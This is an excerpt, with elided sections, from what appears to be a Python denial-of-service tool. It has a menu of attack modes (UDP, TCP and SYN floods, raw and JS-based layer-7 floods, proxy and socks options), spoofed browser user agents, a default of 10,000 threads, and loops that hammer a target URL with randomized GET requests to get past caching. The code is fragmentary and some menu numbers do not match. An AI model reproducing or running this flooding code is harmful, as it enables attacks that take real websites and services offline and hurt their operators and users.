...
useragents=["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
...
def start_mode():
    ...
    print(Fore.WHITE,"-"+Fore.RED, "Proxy&Socks")
    print(Fore.RED,"✫"+Fore.WHITE, "Proxy:〘1〙")
    print(Fore.RED,"✫"+Fore.WHITE, "Socks:〘2〙")
    print(Fore.WHITE,"-"+Fore.RED, "Layer 4")
    print(Fore.RED,"✫"+Fore.WHITE, "UDP-Flood:〘5〙")
    print(Fore.RED,"✫"+Fore.WHITE, "TCP-Flood:〘6〙")
    print(Fore.WHITE,"-"+Fore.RED, "Layer 7")
    print(Fore.RED,"✫"+Fore.WHITE, "Raw-Dos:〘4〙")
    print(Fore.WHITE,"-"+Fore.RED, "Js")
    print(Fore.RED,"✫"+Fore.WHITE, "Js-Normal:〘3〙")
    print('===================')
    print(Fore.WHITE,"-"+Fore.RED, "Home"+Fore.WHITE, " :"+Fore.WHITE, "〘0〙")
    print('')
    choice_mode = input(Fore.WHITE+'[*] Attack Mode [0-6]: ')
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
...
def choice_method_attack():
    ...
    print("-----------------------------")
    print(Fore.WHITE,"|_--> 1: Request ["+Fore.RED, "Normal" +Fore.WHITE, "]")
    print(Fore.WHITE,"|_--> 1: Request ["+Fore.RED, "Spam" +Fore.WHITE, "]")
...
def numthreads():
	global threads
	try:
		threads = int(input("Insert number of threads (10000): "))
	except ValueError:
		threads = 10000
		print ("10000 threads selected.\n")
	multiplication()
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] DDos attacco | JS-Normal @ " +str(random.randint(0, 10000000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
                ...
                try:
                    for y in range(multiple):
                        ...
                        if method_attack == "5":
                            ...
                            soso = scraper.get(url+ "?=" +str(random.randint(0,200000000)), timeout=1)
                except:
                    try:
                        s.close()
                        error += 1
        ...
        while True:
            ...
            try:
                ...
                try:
                    ...
                    pass
            sys.stdout.write("[+] SYN Flood [ DDoS ] | ATTACK [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
